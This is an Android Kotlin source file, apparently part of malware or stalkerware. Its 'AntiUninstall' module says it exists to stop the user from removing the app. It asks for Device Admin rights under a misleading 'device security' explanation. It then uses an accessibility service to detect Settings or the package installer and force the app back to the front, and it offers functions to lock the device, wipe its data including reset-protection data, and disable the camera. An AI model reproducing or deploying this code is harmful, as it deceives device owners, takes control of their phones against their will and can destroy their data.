package com.xrc.app.persistence

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.service.XRCAccessibilityService

/**
 * Anti-uninstall protection using Device Admin and accessibility
 * to prevent the user from removing the app.
 */
object AntiUninstall {

    const val TAG = "AntiUninstall"

    private var adminComponent: ComponentName? = null
    private var dpm: DevicePolicyManager? = null

    fun initialize(context: Context) {
        adminComponent = ComponentName(context, AdminReceiver::class.java)
        dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    }

    fun isAdminActive(context: Context): Boolean {
        val comp = ComponentName(context, AdminReceiver::class.java)
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(comp)
    }

    fun requestAdmin(context: Context) {
        val comp = ComponentName(context, AdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for device security management"
            )
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    fun lockDevice(context: Context) {
        try {
            dpm?.lockNow()
        } catch (e: Exception) {
            Log.e(TAG, "Lock failed: ${e.message}")
        }
    }

    fun wipeDevice(context: Context) {
        try {
            val comp = ComponentName(context, AdminReceiver::class.java)
            dpm?.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE or DevicePolicyManager.WIPE_RESET_PROTECTION_DATA, 0)
        } catch (e: Exception) {
            Log.e(TAG, "Wipe failed: ${e.message}")
        }
    }

    fun disableCamera(context: Context, disable: Boolean) {
        try {
            val comp = ComponentName(context, AdminReceiver::class.java)
            dpm?.setCameraDisabled(comp, disable)
        } catch (e: Exception) {
            Log.e(TAG, "Camera disable failed: ${e.message}")
        }
    }

    fun setPasswordPolicy(context: Context) {
        try {
            val comp = ComponentName(context, AdminReceiver::class.java)
            dpm?.setPasswordMinimumLength(comp, 4)
        } catch (e: Exception) { }
    }

    fun attemptPreventUninstall(context: Context) {
        // Step 1: Check if admin is active
        if (!isAdminActive(context)) {
            requestAdmin(context)
        }

        // Step 2: Use accessibility to detect uninstall attempts
        val accService = XRCAccessibilityService.instance
        if (accService != null) {
            // When Settings or Package Installer is opened, watch for uninstall
            val foregroundPkg = accService.getCurrentForegroundPackage()
            if (foregroundPkg == "com.android.settings" ||
                foregroundPkg == "com.android.packageinstaller" ||
                foregroundPkg.contains("uninstall", ignoreCase = true)
            ) {
                // Launch activity to block uninstall
                // This will bring our app back to front
                val launchIntent = context.packageManager.getLaunchIntentForPackage(
                    context.packageName
                )?.apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                try {
                    context.startActivity(launchIntent)
                } catch (e: Exception) { }
            }
        }
    }
}
